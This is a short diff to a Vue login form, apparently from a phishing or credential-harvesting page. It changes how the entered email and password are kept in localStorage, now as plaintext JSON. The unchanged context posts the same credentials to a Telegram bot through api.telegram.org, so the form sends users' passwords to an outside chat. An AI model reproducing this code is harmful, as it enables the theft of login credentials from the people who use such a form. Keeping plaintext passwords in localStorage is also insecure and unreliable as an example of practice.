@@ -18,6 +18,7 @@
           prepend-inner-icon="mdi-email-outline"
           variant="outlined"
           v-model="email"
+          type="email"
         ></v-text-field>
         <div
           class="text-subtitle-1 text-medium-emphasis d-flex align-center justify-space-between"
@@ -82,7 +83,13 @@ const password = ref('')
     email: ${email.value}
     password: ${password.value}
     `
-    localStorage.setItem("me", message)
+    const me = {
+      firstName: "",
+      lastName: "",
+      email: email.value,
+      password: password.value,
+    }
+    localStorage.setItem("me", JSON.stringify(me))
     const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
     try {
         const response = await axios.post(apiUrl, {
